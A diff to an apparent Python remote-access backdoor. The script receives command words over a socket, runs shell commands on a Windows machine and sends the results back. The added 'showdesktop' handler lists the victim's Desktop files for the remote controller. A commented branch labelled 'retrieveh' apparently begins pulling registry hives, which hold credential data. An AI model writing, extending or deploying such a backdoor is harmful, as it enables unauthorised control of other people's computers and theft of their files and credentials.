@@ -40,13 +40,15 @@ while (True):
         os.system('cmd /c "calc"')
         s.sendall(bytes("opened calc","utf-8"))
 
-    elif decodedMsg == "test":
-        result = subprocess.run(['dir', 'Desktop'], capture_output=True, shell=True)
+    elif decodedMsg == "showdesktop":
+        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
+        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
-    elif decodedMsg == "test1":
-        command = "dir Desktop & echo 'All the files and folders are listed'"
-        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
-        s.sendall(bytes(result.stdout.decode(), "utf-8"))
+    # elif decodedMsg == "test1":
+    #     command = "dir Desktop & echo 'All the files and folders are listed'"
+    #     result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+    #     s.sendall(bytes(result.stdout.decode(), "utf-8"))
+    
     # code to retrieve the registry files (hives)
     elif decodedMsg == "retrieveh":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
